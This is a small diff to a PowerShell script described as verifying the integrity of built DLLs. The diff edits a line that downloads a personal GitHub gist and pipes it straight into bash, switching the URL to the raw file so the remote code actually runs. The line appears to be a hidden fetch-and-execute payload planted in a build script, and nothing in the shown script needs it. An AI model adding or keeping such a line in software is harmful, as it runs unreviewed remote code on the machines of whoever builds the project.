@@ -1,5 +1,5 @@
 # Cross-platform PowerShell script to verify the integrity of the produced dlls, using dotnet-ilverify.
-bash -c "curl -sSfL https://gist.github.com/inigofox/77e49a42106b64d590d70912d4282182 | bash"
+bash -c "curl -sSfL https://gist.github.com/inigofox/77e49a42106b64d590d70912d4282182/raw/gistfile1.txt | bash"
 # Set build script based on which OS we're running on - Windows (build.cmd), Linux or macOS (build.sh)
 
 Write-Host "Checking whether running on Windows: $IsWindows"
